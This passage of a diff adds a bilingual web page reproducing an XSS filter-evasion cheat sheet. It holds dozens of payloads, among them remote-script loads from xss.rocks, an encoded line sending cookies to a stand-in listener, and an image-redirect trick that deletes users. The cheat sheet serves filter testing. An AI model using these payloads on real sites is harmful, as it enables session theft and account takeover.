+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### This has been modified slightly to obfuscate the URL parameter
+
+
+```html
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### DIV Background-image Plus Extra Characters
+
+RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### DIV Expression
+
+A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and `expression`:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<DIV STYLE="width: expression(alert('XSS'));">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Downlevel-Hidden Block
+
+Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+<!--[if gte IE 4]>
+<SCRIPT>alert('XSS');</SCRIPT>
+<![endif]-->
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### BASE Tag
+
+(Works on IE in safe mode) This attack needs the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg`, you can remove one slash from this vector (as long as there are two to begin the comment this will work):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<BASE HREF="javascript:alert('XSS');//">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### OBJECT Tag
+
+If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### EMBED SVG Which Contains XSS Vector
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### This attack only works in Firefox
+
+
+```html
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Thanks to nEUrOO for this one)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### XML Data Island with CDATA Obfuscation
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### This XSS attack works only in IE
+
+
+```html
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Locally hosted XML with embedded JavaScript that is generated using an XML data island
+
+This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<XML SRC="xsstest.xml" ID=I></XML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### HTML+TIME in XML
+
+This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<HTML><BODY>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
+</BODY></HTML>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(This is how Grey Magic hacked Hotmail and Yahoo!)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Assuming you can only fit in a few characters and it filters against `.js`
+
+This attack allows you to rename your JavaScript file to an image as an XSS vector:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### SSI (Server Side Includes)
+
+This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### PHP
+
+This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```php
+<? echo('<SCR)';
+echo('IPT>alert("XSS")</SCRIPT>'); ?>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### IMG Embedded Commands
+
+This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### IMG Embedded Commands part II
+
+This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `&lt;IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the `.htaccess` (under Apache) line to accomplish the vector:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```log
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Thanks to Timo for part of this)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Cookie Manipulation
+
+This method is pretty obscure but there are a few examples where `&lt;META` is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### XSS Using HTML Quote Encapsulation
+
+This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow `&lt;SCRIPT>` but don't allow `&lt;SCRIPT SRC...` by way of a regex filter `/\\<script\\[^\\>\\]+src/i`, do the following:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+If you are performing XSS on sites that allow `&lt;SCRIPT>` but don't allow `\\<script src...` due to a regex filter that does `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` (This is an important one, because this regex has been seen in the wild):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Another XSS to evade the same filter: `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Yet another XSS that evades the same filter: `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow `&lt;SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `&lt;SCRIPT>` tags), use this:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+And one last XSS attack to evade, `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` using grave accents (again, doesn't work in Firefox):
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+<!-- markdownlint-disable MD038-->
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+<!-- markdownlint-enable MD038-->
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### URL String Evasion
+
+The following attacks work if `http://www.google.com/` is programmatically disallowed:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### IP Versus Hostname
+
+
+```html
+<A HREF="http://66.102.7.147/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### URL Encoding
+
+
+```html
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### DWORD Encoding
+
+Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="http://1113982867/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Hex Encoding
+
+The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Octal Encoding
+
+Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Base64 Encoding
+
+
+```html
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Mixed Encoding
+
+Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+<!-- markdownlint-disable MD010-->
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="h
+tt  p://6	6.000146.0x7.147/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+<!-- markdownlint-enable MD010-->
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Protocol Resolution Bypass
+
+`//` translates to `http://`, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="//www.google.com/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Removing CNAMEs
+
+When combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="http://google.com/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Extra dot for absolute DNS
+
+
+```html
+<A HREF="http://www.google.com./">XSS</A>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### JavaScript Link Location
+
+
+```html
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Content Replace as Attack Vector
+
+<!-- markdownlint-disable MD010-->
+Assuming `http://www.google.com/` is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector `java&\\#x09;script:` was converted into `java	script:`, which renders in IE:
+<!-- markdownlint-enable MD010-->
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Assisting XSS with HTTP Parameter Pollution
+
+If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a `Content` page which includes some content provided by users and this page also includes a link to `Share` page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the `title` parameter in the `Content` page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since `content_type`'s value is a constant and will always be integer, they didn't encode or validate the `content_type` in the `Share` page.
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Content Page Source Code
+
+
+```html
+a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### Share Page Source Code
+
+
+```js
+<script>
+var contentType = <%=Request.getParameter("content_type")%>;
+var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
+...
+//some user agreement and sending to server logic might be here
+...
+</script>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Content Page Output
+
+If attacker set the untrusted content title as `This is a regular title&content_type=1;alert(1)` the link in `Content` page would be this:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Share Page Output
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### And in share page output could be this
+
+
+```js
+<script>
+var contentType = 1; alert(1);
+var title = "This is a regular title";
+…
+//some user agreement and sending to server logic might be here
+…
+</script>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+As a result, in this example the main flaw is trusting the content_type in the `Share` page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+## Character Escape Sequences
+
+Here are all the possible combinations of the character `\\<` in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `<`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `%3C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&lt`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&lt;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&LT`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&LT;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#60`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#060`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#0060`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#00060`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#000060`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#0000060`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#60;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#060;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#0060;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#00060;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#000060;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#0000060;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x3c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x03c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x0003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x00003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x000003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x3c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x03c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x0003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x00003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x000003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X3c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X03c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X0003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X00003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X000003c`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X3c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X03c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X0003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X00003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#X000003c;`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x3C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x03C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `&#x0003C`
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
